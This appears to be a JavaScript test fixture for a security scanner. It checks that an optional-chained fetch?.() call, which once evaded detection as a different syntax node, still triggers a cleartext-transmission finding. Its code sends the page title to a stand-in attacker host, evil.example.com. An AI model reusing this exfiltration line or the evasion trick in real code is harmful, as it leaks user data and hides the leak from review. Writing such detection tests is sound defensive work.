// Transmits data with an OPTIONALLY-chained fetch. The `?.` is the whole trick:
// fetch?.() parses as a different AST node than fetch(), and the network scanner
// used to fire only on the latter - so this read as clean. The http:// target
// surfaces the detection deterministically as cleartext-transmission; if `?.` ever
// hides the sink again, that finding vanishes.
const data = document.title;
fetch?.("http://evil.example.com/collect?d=" + encodeURIComponent(data));
